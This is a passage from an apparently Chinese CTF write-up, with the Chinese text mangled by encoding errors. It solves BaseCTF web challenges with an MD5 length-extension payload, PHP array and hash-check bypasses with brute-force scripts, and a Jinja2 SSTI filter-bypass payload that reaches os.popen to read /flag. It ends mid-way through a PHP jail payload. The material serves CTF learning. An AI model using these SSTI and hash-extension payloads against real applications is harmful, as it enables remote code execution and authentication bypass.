class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token constant">E9</span><span class="token operator">%</span><span class="token constant">CC</span><span class="token operator">%</span><span class="token constant">C5</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token number">0</span>E<span class="token operator">%</span><span class="token constant">D4</span><span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token constant">BB</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token constant">B1</span><span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">C0</span><span class="token operator">%</span><span class="token number">23</span>Vg<span class="token operator">%</span>A2u<span class="token operator">%</span><span class="token number">05</span><span class="token operator">%</span><span class="token number">95</span>Z<span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">8</span>DS<span class="token operator">%</span><span class="token number">0</span>A<span class="token operator">%</span><span class="token number">92</span><span class="token operator">%</span><span class="token constant">EC</span><span class="token operator">%</span><span class="token constant">BC</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">08</span><span class="token operator">%</span><span class="token constant">F2</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span>EDf<span class="token operator">%</span><span class="token constant">FA</span><span class="token operator">%</span><span class="token constant">EB</span><span class="token operator">-</span>ha<span class="token operator">%</span><span class="token number">88</span>S<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">95</span>E<span class="token operator">%</span><span class="token constant">F6</span><span class="token operator">%</span><span class="token constant">A1</span><span class="token operator">%</span><span class="token number">1</span>B<span class="token operator">%</span><span class="token number">5</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">21</span>y<span class="token operator">%</span><span class="token constant">A5</span><span class="token operator">%</span><span class="token number">12</span><span class="token operator">%</span><span class="token constant">E6</span><span class="token operator">%</span><span class="token constant">B5H</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span>F7Lci<span class="token operator">%</span><span class="token number">8</span>Dg<span class="token operator">%</span><span class="token constant">FC</span><span class="token operator">%</span><span class="token number">7</span>B8y<span class="token operator">%</span><span class="token constant">CD</span><span class="token operator">%</span><span class="token constant">A3</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span><span class="token constant">E4</span><span class="token operator">%</span><span class="token constant">E7</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token number">0</span>F<span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token constant">C9</span><span class="token operator">%</span><span class="token number">13</span><span class="token operator">%</span>C8n<span class="token operator">%</span><span class="token number">8</span>A<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span><span class="token constant">F9</span><span class="token operator">%</span><span class="token number">9</span>FK_a<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span>C1h<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">B5</span><span class="token operator">%</span><span class="token number">0</span>Atg<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">5</span>E<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">95</span>g<span class="token operator">%</span><span class="token constant">F9T</span><span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token number">02</span>K<span class="token operator">%</span><span class="token number">04</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">0</span>D<span class="token operator">%</span><span class="token constant">CA</span><span class="token operator">%</span><span class="token constant">C8</span><span class="token operator">%</span><span class="token constant">A8W</span><span class="token operator">%</span><span class="token number">1</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">84</span><span class="token operator">%</span><span class="token number">9</span>FV<span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token constant">BCT</span></code></pre><p>Á¨¨ÂõõÂ±Ç‰∏∫ÂìàÂ∏åÊãìÂ±ïÊîªÂáª</p><p>ÂèÇËÄÉÊñáÁ´†Ôºö</p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html">ÂìàÂ∏åÈïøÂ∫¶Êâ©Â±ïÊîªÂáª</a></p><p><a href="https://luoingly.top/post/md5-length-extension-attack/">ÊµÖÊûê MD5 ÈïøÂ∫¶Êâ©Â±ïÊîªÂáª (MD5 Length Extension Attack)</a></p><p>‰ΩøÁî®Â∑•ÂÖ∑Ôºö</p><p><a href="https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py">md5-extension-attack.py</a></p><p>ÂØπ‰∫éÂéüÂßãÊñáÊú¨ÁöÑÊµãÈáèÔºåÈ¢òÁõÆÁªôÂá∫‰∫Ü<code>$_SESSION[&#39;random&#39;]</code>ÁöÑÊûÑÈÄ†ÊñπÂºè</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span></code></pre><p><img src="MD5.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">name<span class="token operator">=</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">03</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span>admin<span class="token operator">&amp;</span>md5<span class="token operator">=</span>f2f894abbd41c972a311332cfe76c6fe</code></pre><h4 id="Áé©ÂéüÁ•ûÁé©ÁöÑ"><a href="#Áé©ÂéüÁ•ûÁé©ÁöÑ" class="headerlink" title="Áé©ÂéüÁ•ûÁé©ÁöÑ"></a>Áé©ÂéüÁ•ûÁé©ÁöÑ</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Èîô‰∫ÜÔºÅÂ∞±‰Ω†ËøòÊÉ≥Áé©ÂéüÁ•ûÔºü‚ùå‚ùå‚ùå"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ys_open</span><span class="token punctuation">(</span><span class="token variable">$tip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$tip</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"ÊàëË¶ÅÁé©ÂéüÁ•û"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Êàë‰∏çÁÆ°ÔºåÊàëË¶ÅÁé©ÂéüÁ•ûÔºÅüò≠üò≠üò≠"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">dumpFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">sizeof</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÂèØÊÅ∂ÁöÑQQ‰∫∫ÔºÅüò°üò°üò°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"100%"</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"love100%"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÊüêÁ´ôÂ¥©‰∫ÜÔºüËÇØÂÆöÊòØÊüêÂøΩÊÇ†Âπ≤ÁöÑÔºÅüò°üò°üò°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>  <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ii</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$ii</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ii</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$ii</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token variable">$ii</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>‰∏çÁü•ÈÅì<code>$array</code>ÁöÑÈïøÂ∫¶ÂèØ‰ª•Áõ¥Êé•pyÁàÜÁ†¥</p><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"len[0]=1"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"payload.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&amp;len[</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">]=1"</span></span></code></pre><p>ÂêéÈù¢‰∏§‰∏™ÂæàÂ•ΩÁªïËøáÔºåËÆ∞Âæó<code>%</code>Ë¶ÅurlÁºñÁ†Å</p><pre class="language-http" data-language="http"><code class="language-http">POST:len[0]=1&amp;len[1]=1&amp;len[2]=1&amp;len[3]=1&amp;len[4]=1&amp;len[5]=1&amp;len[6]=1&amp;len[7]=1&amp;len[8]=1&amp;len[9]=1&amp;len[10]=1&amp;len[11]=1&amp;len[12]=1&amp;len[13]=1&amp;len[14]=1&amp;len[15]=1&amp;len[16]=1&amp;len[17]=1&amp;len[18]=1&amp;len[19]=1&amp;len[20]=1&amp;len[21]=1&amp;len[22]=1&amp;len[23]=1&amp;len[24]=1&amp;len[25]=1&amp;len[26]=1&amp;len[27]=1&amp;len[28]=1&amp;len[29]=1&amp;len[30]=1&amp;len[31]=1&amp;len[32]=1&amp;len[33]=1&amp;len[34]=1&amp;len[35]=1&amp;len[36]=1&amp;len[37]=1&amp;len[38]=1&amp;len[39]=1&amp;len[40]=1&amp;len[41]=1&amp;len[42]=1&amp;len[43]=1&amp;len[44]=1&amp;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966</code></pre><p>ÊúÄÂêéÊ†πÊçÆÁªôÂá∫Âä†ÂØÜÂêéÁöÑ flag Êï∞ÁªÑÔºåÂä†ÂØÜÊµÅÁ®ãÊòØÊää flag ÊØè‚ºÄ‰∏™Â≠óÁ¨¶ÁöÑ ASCII ÂÄºÂíåÂΩìÂâçÁ¥¢ÂºïÂºÇÊàñÂÜçÂèñ md5 ÂÄºÔºåÊå®‰∏™ËæìÂá∫ÔºåËÑöÊú¨ÁàÜÁ†¥Âç≥ÂèØ </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="token punctuation">,</span> <span class="token string">"26657d5ff9020d2abefe558796b99584"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span>       <span class="token string">"ec8956637a99787bd197eacd77acce5e"</span><span class="token punctuation">,</span> <span class="token string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">,</span>       <span class="token string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="token punctuation">,</span> <span class="token string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="token punctuation">,</span> <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span>       <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span> <span class="token string">"66f041e16a60928b05a7e228a89c3799"</span><span class="token punctuation">,</span> <span class="token string">"2838023a778dfaecdc212708f721b788"</span><span class="token punctuation">,</span>       <span class="token string">"65b9eea6e1cc6bb9f0cd2a47751a186f"</span><span class="token punctuation">,</span> <span class="token string">"9a1158154dfa42caddbd0694a4e9bdc8"</span><span class="token punctuation">,</span> <span class="token string">"698d51a19d8a121ce581499d7b701668"</span><span class="token punctuation">,</span>       <span class="token string">"f0935e4cd5920aa6c7c996a5ee53a70f"</span><span class="token punctuation">,</span> <span class="token string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>       <span class="token string">"07e1cd7dca89a1678042477183b7ac3f"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>       <span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span> <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"a5771bce93e200c36f7cd9dfd0e5deaa"</span><span class="token punctuation">,</span>       <span class="token string">"f7177163c833dff4b38fc8d2872f1ec6"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="token punctuation">,</span>       <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"4c56ff4ce4aaf9573aa5dff913df997a"</span><span class="token punctuation">,</span>       <span class="token string">"da4fb5c6e93e74d3df8527599fa62642"</span><span class="token punctuation">,</span> <span class="token string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="token punctuation">,</span> <span class="token string">"a3f390d88e4c41f2747bfa2f1b5f87db"</span><span class="token punctuation">,</span>       <span class="token string">"c74d97b01eae257e44aa9d5bade97baf"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span>       <span class="token string">"6ea9ab1baa0efb9e19094440c317e21b"</span><span class="token punctuation">,</span> <span class="token string">"7cbbc409ec990f19c78c75bd1e06f215"</span><span class="token punctuation">,</span> <span class="token string">"98f13708210194c475687be6106a3b84"</span><span class="token punctuation">,</span>       <span class="token string">"3c59dc048e8850243be8079a5c74d079"</span><span class="token punctuation">,</span> <span class="token string">"4e732ced3463d06de0ca9a15b6153677"</span><span class="token punctuation">,</span> <span class="token string">"02e74f10e0327ad868d138f2b4fdd6f0"</span><span class="token punctuation">,</span>       <span class="token string">"35f4a8d465e6e1edc05f3d8ab658c551"</span><span class="token punctuation">,</span> <span class="token string">"28dd2c7955ce926456240b2ff0100bde"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="Â§çËØªÊú∫-SSTI"><a href="#Â§çËØªÊú∫-SSTI" class="headerlink" title="Â§çËØªÊú∫(SSTI)"></a>Â§çËØªÊú∫(SSTI)</h4><p>ËøáÊª§‰∫ÜÂæàÂ§ö‰∏ú‚ªÑÔºå‚ΩΩ‰∏îË¶ÅÊ±Ç‰º†‚ºäÁöÑÂ≠óÁ¨¶‰∏≤ÂøÖÈ°ª‰ª• BaseCTF{ ÂºÄÂ§¥ÔºåËøò‰ºöÊ£ÄÊµãÊã¨Âè∑ÂåπÈÖç„ÄÇËøô‚æ•‰Ωø‚Ω§‚ºØÂÖ∑ FenjingÔºåÊú¨Âú∞ÂÖàÊê≠‚ºÄ‰∏™ÂèØ‰ª•Ë¢´ SSTI ÁöÑÊúçÂä°Âô®ÔºåÁÑ∂Âêé‚ºøÂä®ÊääËøáÊª§ÁöÑÂ≠óÁ¨¶‰∏≤ÈÉΩËØïÂá∫Êù•ÔºåÂÜç‚Ω§Fenjing Ë∑ë„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_stringapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>             <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'builtin'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span>             <span class="token string">'lipsum'</span><span class="token punctuation">,</span> <span class="token string">'cycler'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'pop'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'reverse'</span>             <span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>i <span class="token keyword">in</span> name <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"error"</span>    t <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span></code></pre><p>Payload</p><pre class="language-http" data-language="http"><code class="language-http">fenjing:python -m fenjing crack --url http://IP:5000/ --method GET --inputs namePOST:flag=BaseCTF&#123;%set in='_'~'_'~'i''nit'~'_'~'_'%&#125;&#123;%set gl='_'~'_'~'g''lobals'~'_'~'_'%&#125;&#123;%set bu='_'~'_'~'b''uiltins'~'_'~'_'%&#125;&#123;%set im='_'~'_'~'import'~'_'~'_'%&#125;&#123;%set da='OS'|lower%&#125;&#123;%set ca='%c%c%c%c%c%c%c%c%c'%(99,97,116,32,47,102,108,97,103)%&#125;&#123;%print joiner[in][gl][bu][im](da)['p''open'](ca)['read']()%&#125;</code></pre><h4 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>Jail<span class="token punctuation">[</span>by<span class="token operator">.</span>Happy<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/f*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token 